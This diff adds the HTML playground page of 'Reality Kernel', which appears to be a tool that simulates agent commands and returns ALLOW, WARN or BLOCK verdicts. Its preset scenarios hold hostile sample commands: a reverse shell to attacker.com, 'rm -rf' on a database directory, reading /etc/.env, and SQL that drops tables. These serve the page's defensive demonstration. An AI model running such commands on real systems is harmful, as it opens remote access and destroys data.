@@ -1,0 +1,397 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Playground · Reality Kernel</title>
+  <meta name="description" content="Test system commands against parallel shadow-world trajectories in the Reality Kernel simulation sandbox." />
+  <!-- Open Graph / LinkedIn / Slack -->
+  <meta property="og:type" content="website" />
+  <meta property="og:url" content="https://www.realitykernel.dev/playground" />
+  <meta property="og:title" content="Live Causal Simulation Playground · Reality Kernel" />
+  <meta property="og:description" content="Try it live. Submit any agent command and watch Reality Kernel simulate it across shadow worlds — returning ALLOW, WARN, or BLOCK with cryptographic evidence. No API key needed." />
+  <meta property="og:image" content="https://www.realitykernel.dev/og-preview.png" />
+  <meta property="og:image:width" content="1200" />
+  <meta property="og:image:height" content="630" />
+  <meta property="og:site_name" content="Reality Kernel" />
+  <!-- Twitter / X Card -->
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="Live Causal Simulation Playground · Reality Kernel" />
+  <meta name="twitter:description" content="Try it live. Submit any agent command, watch it simulate across shadow worlds, get ALLOW / WARN / BLOCK with cryptographic evidence. No key required." />
+  <meta name="twitter:image" content="https://www.realitykernel.dev/og-preview.png" />
+  <meta http-equiv="Content-Security-Policy" content="
+    default-src 'self';
+    script-src 'self' 'unsafe-inline';
+    style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
+    font-src 'self' https://fonts.gstatic.com;
+    img-src 'self' data:;
+    connect-src 'self' https://vitals.vercel-insights.com;
+    frame-ancestors 'none';
+    base-uri 'self';
+    form-action 'self'
+  " />
+  <meta name="referrer" content="strict-origin-when-cross-origin" />
+  <link rel="stylesheet" href="/styles.css" />
+  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
+  <link rel="apple-touch-icon" href="/favicon.png" />
+  <meta name="theme-color" content="#050507" />
+  <script defer src="/_vercel/speed-insights/script.js"></script>
+</head>
+<body>
+
+  <header class="landing-nav">
+    <a href="/" style="text-decoration:none; border-bottom:none;">
+      <div class="brand">
+        <div class="brand-mark"><img src="/logo.png" alt="Reality Kernel" /></div>
+        <div>
+          <strong>REALITY KERNEL <span class="badge-beta">BETA</span></strong>
+          <span class="brand-sub">Sovereign Reasoning Engine</span>
+        </div>
+      </div>
+    </a>
+    <nav class="nav-links">
+      <a href="/" class="nav-link">Product</a>
+      <a href="/security" class="nav-link">Security</a>
+      <a href="/integration" class="nav-link">Docs</a>
+      <a href="/pricing" class="nav-link">Pricing</a>
+      <a href="/playground" class="nav-link active">Playground</a>
+    </nav>
+    <div class="nav-cta">
+      <a href="/login" class="btn btn-sm ghost" style="margin-top:0; text-decoration:none; border-bottom:none;" id="nav-auth-btn">Sign in</a>
+    </div>
+  </header>
+
+  <div class="public-hero">
+    <h1>Causal reasoning <em>playground</em></h1>
+    <p>Simulate system actions across parallel shadow worlds. Enter a command, state the operator's intent, and read the divergence signals the engine surfaces.</p>
+  </div>
+
+  <main class="public-container">
+    <div class="card">
+      <h3 style="margin-top: 0;">Interactive simulator</h3>
+      <p class="muted" style="margin-bottom: 20px;">Select a preset scenario or write a custom command payload to begin the simulation.</p>
+
+      <div class="scenario-chips">
+        <button class="chip" data-scn="0" type="button">Organise logs</button>
+        <button class="chip" data-scn="1" type="button">Read config</button>
+        <button class="chip" data-scn="2" type="button">Clean database</button>
+        <button class="chip" data-scn="3" type="button">TCP probe</button>
+        <button class="chip" data-scn="4" type="button">SQL migrate</button>
+      </div>
+
+      <div style="margin-top: 20px;">
+        <label for="pgLanding-cmd">Command payload</label>
+        <textarea id="pgLanding-cmd" class="mono" rows="3" placeholder="ls -la /var/log"></textarea>
+      </div>
+
+      <div style="margin-top: 16px;">
+        <label for="pgLanding-intent">Operator stated intent</label>
+        <input id="pgLanding-intent" type="text" placeholder="organise log files into dated folders" />
+      </div>
+
+      <button id="pgLanding-run" class="btn-block" style="margin-top: 24px;">
+        <span>Run simulation</span>
+        <span style="font-family: var(--font-mono);">→</span>
+      </button>
+
+      <div id="pgLanding-emptyState" style="margin-top: 24px; padding: 48px 24px; text-align: center; border: 1px dashed var(--border); border-radius: 8px; background: rgba(255,255,255,0.01);">
+        <div style="font-size: 24px; color: var(--text-muted); margin-bottom: 12px; opacity: 0.5;">∿</div>
+        <div style="color: var(--text-2); font-size: 14px; font-weight: 500;">Ready for simulation</div>
+        <div style="color: var(--text-muted); font-size: 13px; margin-top: 4px;">Run a scenario above to observe causal verification in action.</div>
+      </div>
+
+      <div id="pgLanding-verdictBanner" class="verdict-banner" style="margin-top: 24px;"></div>
+
+      <div id="pgLanding-reviewActions" class="review-actions" style="margin-top: 20px;">
+        <div class="label" style="margin-bottom: 16px;">
+          <span style="color: var(--warn); font-weight: 500; display: block; margin-bottom: 4px; font-family: var(--font-mono); font-size: 11px; text-transform: uppercase; letter-spacing: 0.1em;">Causal divergence detected</span>
+          <span style="font-size: 13px; color: var(--text-2);">The engine recommends manual verification. Select the appropriate response protocol.</span>
+        </div>
+        <div style="display: flex; gap: 10px;">
+          <button class="btn btn-sm success" id="pgLanding-approveBtn" type="button">Authorize execution</button>
+          <button class="btn btn-sm danger" id="pgLanding-rejectBtn" type="button">Terminate action</button>
+        </div>
+      </div>
+      <div id="pgLanding-reviewDecision" class="review-decision" style="margin-top: 20px;"></div>
+
+      <div id="pgLanding-structured" class="pg-structured-response" hidden></div>
+
+      <div id="pgLanding-raw-container" hidden style="margin-top: 16px;">
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
+          <h5 style="margin: 0; font-family: var(--font-mono); text-transform: uppercase; letter-spacing: 0.1em; color: var(--text-muted); font-size: 10.5px; font-weight: 500;">Raw simulation response</h5>
+          <button class="btn btn-sm ghost" id="pgLanding-raw-toggle" style="margin: 0; padding: 4px 10px; font-size: 10.5px; border-bottom: none;" type="button">Show raw JSON</button>
+        </div>
+        <pre id="pgLanding-out" class="output" style="font-size: 12px; max-height: 500px; overflow-y: auto; margin: 0;" hidden></pre>
+      </div>
+    </div>
+
+    <section class="card">
+      <h3 style="margin-top: 0;">How to read the response</h3>
+      <div style="display:grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 14px;">
+        <div style="padding: 18px; border: 1px solid var(--border); border-radius: 10px; background: var(--bg-elev-1);">
+          <div class="label" style="margin-bottom: 10px;">Divergence</div>
+          <p style="margin:0; font-size:13px; line-height:1.65; color: var(--text-2);">Low divergence usually indicates the requested action stays inside a stable basin. Higher divergence means downstream effects are pulling toward destructive or ambiguous state changes.</p>
+        </div>
+        <div style="padding: 18px; border: 1px solid var(--border); border-radius: 10px; background: var(--bg-elev-1);">
+          <div class="label" style="margin-bottom: 10px;">Evidence</div>
+          <p style="margin:0; font-size:13px; line-height:1.65; color: var(--text-2);">Evidence labels summarize why the engine escalated or blocked a request: destructive writes, intent divergence, egress mismatch, privilege shifts, session escalation patterns.</p>
+        </div>
+        <div style="padding: 18px; border: 1px solid var(--border); border-radius: 10px; background: var(--bg-elev-1);">
+          <div class="label" style="margin-bottom: 10px;">Operator workflow</div>
+          <p style="margin:0; font-size:13px; line-height:1.65; color: var(--text-2);">ALLOW continues automatically. WARN moves into operator review with an explicit approve/block decision. BLOCK terminates execution and preserves the proof hash for downstream audit.</p>
+        </div>
+      </div>
+    </section>
+
+    <div class="funnel-cta-card hide-on-auth">
+      <h3>Secure your fleet operations</h3>
+      <p>Free playground queries are rate-limited and do not record audit trails. Contact Keter Labs to receive persistent logs, team management, high credit allowances, and custom verification configurations.</p>
+      <div style="display: flex; gap: 10px; justify-content: center; margin-top: 20px; flex-wrap: wrap;">
+        <a href="/" class="btn" style="margin-top: 0; text-decoration: none; border-bottom: none;">Get API key</a>
+        <a href="/integration" class="btn ghost" style="margin-top: 0; text-decoration: none; border-bottom: none;">Integration docs</a>
+      </div>
+    </div>
+
+    <div id="pgLanding-toastStack" class="toast-stack"></div>
+  </main>
+
+  <footer class="site-footer">
+    <p>REALITY KERNEL · EFFECT-CLASS PLAYGROUND · RATE-LIMITED PUBLIC DEMO</p>
+    <div style="display: flex; gap: 20px; justify-content: center; margin-top: 12px; align-items: center;">
+      <a href="mailto:contact@realitykernel.dev" title="Email us" style="color: var(--text-muted); display: inline-flex; align-items: center; gap: 6px; font-size: 13px; text-decoration: none; border-bottom: none;">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"/></svg>
+        contact@realitykernel.dev
+      </a>
+      <span style="color: var(--text-faint);">·</span>
+      <a href="https://www.linkedin.com/company/keter-labs/" target="_blank" rel="noopener" title="LinkedIn" style="color: var(--text-muted); display: inline-flex; align-items: center; gap: 6px; font-size: 13px; text-decoration: none; border-bottom: none;">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"/><rect x="2" y="9" width="4" height="12"/><circle cx="4" cy="4" r="2"/></svg>
+        Keter Labs
+      </a>
+    </div>
+  </footer>
+
+  <script src="/app.js"></script>
+  <script>
+    (function () {
+      const esc = rk.htmlEscape;
+      const SCENARIOS = [
+        { cmd: 'ls /var/log',                                   intent: 'organise log files into dated folders' },
+        { cmd: 'cat /etc/.env',                                 intent: 'show me the last 10 lines of the error log' },
+        { cmd: "rm -rf /var/lib/db && echo 'done'",             intent: 'summarise the app logs' },
+        { cmd: 'bash -i >& /dev/tcp/attacker.com/4444 0>&1',    intent: 'check server connectivity' },
+        { cmd: 'DROP TABLE users; DELETE FROM transactions;',   intent: 'run the database migration script' },
+      ];
+
+      let typeTimer;
+      function typeEffect(el, text, speed = 15) {
+        clearTimeout(typeTimer);
+        el.value = '';
+        let i = 0;
+        function type() {
+          if (i < text.length) {
+            el.value += text.charAt(i);
+            i++;
+            typeTimer = setTimeout(type, speed);
+          }
+        }
+        type();
+      }
+
+      document.querySelectorAll('.scenario-chips .chip').forEach(c => {
+        c.addEventListener('click', () => {
+          document.querySelectorAll('.scenario-chips .chip').forEach(x => x.classList.remove('active'));
+          c.classList.add('active');
+          const s = SCENARIOS[+c.dataset.scn] || SCENARIOS[0];
+          typeEffect(document.getElementById('pgLanding-cmd'), s.cmd);
+          document.getElementById('pgLanding-intent').value = s.intent;
+        });
+      });
+
+      document.getElementById('pgLanding-cmd').value    = SCENARIOS[0].cmd;
+      document.getElementById('pgLanding-intent').value = SCENARIOS[0].intent;
+      document.querySelector('.scenario-chips .chip[data-scn="0"]').classList.add('active');
+
+      const emptyState = document.getElementById('pgLanding-emptyState');
+      const banner   = document.getElementById('pgLanding-verdictBanner');
+      const actions  = document.getElementById('pgLanding-reviewActions');
+      const decision = document.getElementById('pgLanding-reviewDecision');
+      const pgOut    = document.getElementById('pgLanding-out');
+      const pgStructured = document.getElementById('pgLanding-structured');
+      const pgRawContainer = document.getElementById('pgLanding-raw-container');
+      const pgRawToggle = document.getElementById('pgLanding-raw-toggle');
+      const stack = document.getElementById('pgLanding-toastStack');
+
+      let currentActionId = null;
+
+      function toast(kind, title, msg) {
+        const el = document.createElement('div');
+        el.className = 'toast ' + (kind || 'info');
+        el.innerHTML = `<div style="flex:1"><strong>${esc(title)}</strong><span>${esc(msg || '')}</span></div>`;
+        stack.appendChild(el);
+        setTimeout(() => el.classList.add('fade-out'), 4200);
+        setTimeout(() => el.remove(), 4500);
+      }
+
+      pgRawToggle.onclick = () => {
+        if (pgOut.hidden) {
+          pgOut.hidden = false;
+          pgRawToggle.textContent = 'Hide raw JSON';
+        } else {
+          pgOut.hidden = true;
+          pgRawToggle.textContent = 'Show raw JSON';
+        }
+      };
+
+      function paintBanner(verdict, evidence) {
+        banner.className = 'verdict-banner';
+        decision.className = 'review-decision';
+        actions.classList.remove('show');
+        if (!verdict) return;
+
+        const map = {
+          ALLOW: { label: 'Basin A · action permitted',            cls: 'vb-allow', icon: '+' },
+          WARN:  { label: 'Suspicious trajectory · review needed', cls: 'vb-warn',  icon: '!' },
+          BLOCK: { label: 'Reflexive collapse · action blocked',   cls: 'vb-block', icon: '×' },
+        };
+        const m = map[verdict] || map.WARN;
+        banner.classList.add('show', m.cls);
+        banner.innerHTML = `
+          <div class="icon" data-icon="${m.icon}"></div>
+          <div class="text">
+            <small>verdict</small>
+            <div>${m.label}</div>
+          </div>
+          <div style="font-family: var(--font-mono); font-size: 11px; opacity: .8; letter-spacing: .04em;">
+            ${Array.isArray(evidence) && evidence.length ? esc(evidence.slice(0,2).join(' · ')) : '—'}
+          </div>
+        `;
+        if (verdict === 'WARN') actions.classList.add('show');
+      }
+
+      function syntaxHighlightJSON(json) {
+        if (typeof json !== 'string') json = JSON.stringify(json, null, 2);
+        json = json.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+        return json.replace(
+          /("(\\u[a-fA-F0-9]{4}|\\[^u]|[^\\"])*"(\s*:)?|\b(true|false|null)\b|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?)/g,
+          function (match) {
+            var cls = 'json-number';
+            if (/^"/.test(match)) {
+              if (/:$/.test(match)) cls = 'json-key';
+              else cls = 'json-string';
+            } else if (/true|false/.test(match)) cls = 'json-boolean';
+            else if (/null/.test(match)) cls = 'json-null';
+            return '<span class="' + cls + '">' + match + '</span>';
+          }
+        );
+      }
+
+      function renderStructuredResponse(container, body) {
+        container.hidden = false;
+        const evidenceHtml = Array.isArray(body.evidence) && body.evidence.length
+          ? `<ul class="pg-evidence-list">${body.evidence.map(e => `<li>${esc(e)}</li>`).join('')}</ul>`
+          : `<ul class="pg-evidence-list empty"><li>No malicious divergence evidence found in system state.</li></ul>`;
+
+        container.innerHTML = `
+          <h4 style="margin: 0 0 16px 0; font-family: var(--font-mono); text-transform: uppercase; font-size: 11px; color: var(--accent); letter-spacing: 0.15em;">Causal analysis summary</h4>
+          <div class="pg-response-grid">
+            <div class="pg-metric">
+              <div class="label">Action ID</div>
+              <div class="value"><code>${esc(body.action_id || 'N/A')}</code></div>
+            </div>
+            <div class="pg-metric">
+              <div class="label">Latency</div>
+              <div class="value">${esc(body.latency_ms ?? '—')} ms</div>
+            </div>
+            <div class="pg-metric">
+              <div class="label">Confidence</div>
+              <div class="value">${((body.confidence || 0) * 100).toFixed(1)}%</div>
+            </div>
+            <div class="pg-metric">
+              <div class="label">Worlds evaluated</div>
+              <div class="value">${esc(body.worlds_evaluated ?? '—')} / 5</div>
+            </div>
+            <div class="pg-metric">
+              <div class="label">Basin B count</div>
+              <div class="value">${esc(body.worlds_in_basin_b ?? '—')}</div>
+            </div>
+            <div class="pg-metric">
+              <div class="label">Max divergence</div>
+              <div class="value">${esc(body.max_divergence ?? '—')}</div>
+            </div>
+          </div>
+          <div class="pg-metric" style="margin-top: 12px; border-left-color: var(--accent);">
+            <div class="label">Causal evidence &amp; threat signals</div>
+            <div class="value" style="font-weight: 500; font-size: 13px; margin-top: 6px;">${evidenceHtml}</div>
+          </div>
+          <div class="pg-metric" style="margin-top: 12px; border-left-color: var(--info);">
+            <div class="label">Cryptographic proof seal</div>
+            <div class="value" style="font-family: var(--font-mono); font-size: 10px; word-break: break-all; color: var(--text-2); font-weight: 500;">
+              ${esc(body.proof_hash || 'N/A')}
+            </div>
+          </div>
+        `;
+      }
+
+      document.getElementById('pgLanding-run').onclick = async () => {
+        const cmd    = document.getElementById('pgLanding-cmd').value.trim();
+        const intent = document.getElementById('pgLanding-intent').value.trim();
+        const $btn   = document.getElementById('pgLanding-run');
+        if (!cmd || !intent) {
+          toast('warn', 'Missing input', 'Both the command and intent fields are required.');
+          return;
+        }
+
+        $btn.disabled = true;
+        $btn.textContent = 'Running…';
+
+        emptyState.hidden = true;
+        pgStructured.hidden = true;
+        pgRawContainer.hidden = true;
+        pgOut.hidden = true;
+        pgRawToggle.textContent = 'Show raw JSON';
+        paintBanner(null);
+
+        const r = await rk.call('/v1/demo', {
+          method: 'POST',
+          body: JSON.stringify({ command: cmd, prime_intent: intent }),
+        });
+
+        $btn.disabled = false;
+        $btn.innerHTML = '<span>Run simulation</span><span style="font-family: var(--font-mono);">→</span>';
+
+        if (!r.ok) {
+          pgRawContainer.hidden = false;
+          pgOut.hidden = false;
+          pgOut.innerHTML = `<span class="json-null">Error: ${esc(r.body?.detail || 'Simulation failed')}</span>`;
+          toast('warn', 'Check failed', r.body?.detail || ('HTTP ' + r.status));
+          return;
+        }
+
+        currentActionId = r.body.action_id;
+        renderStructuredResponse(pgStructured, r.body);
+
+        pgOut.innerHTML = syntaxHighlightJSON(r.body);
+        pgRawContainer.hidden = false;
+
+        paintBanner(r.body.verdict, r.body.evidence);
+      };
+
+      document.getElementById('pgLanding-approveBtn').onclick = () => {
+        if (!currentActionId) return;
+        decision.className = 'review-decision show approved';
+        decision.innerHTML = `<span>+</span><span>Operator authorization confirmed. Override tag <code>warning(approved)</code> has been recorded in the secure audit ledger.</span>`;
+        actions.classList.remove('show');
+        toast('success', 'Action authorized', 'Override recorded in audit ledger.');
+      };
+
+      document.getElementById('pgLanding-rejectBtn').onclick = () => {
+        if (!currentActionId) return;
+        decision.className = 'review-decision show rejected';
+        decision.innerHTML = `<span>×</span><span>Action terminated. Block policy upheld — the agent retry path has been sealed in the audit chain.</span>`;
+        actions.classList.remove('show');
+        toast('warn', 'Action terminated', 'Block policy enforced.');
+      };
+    })();
+  </script>
+</body>
+</html>
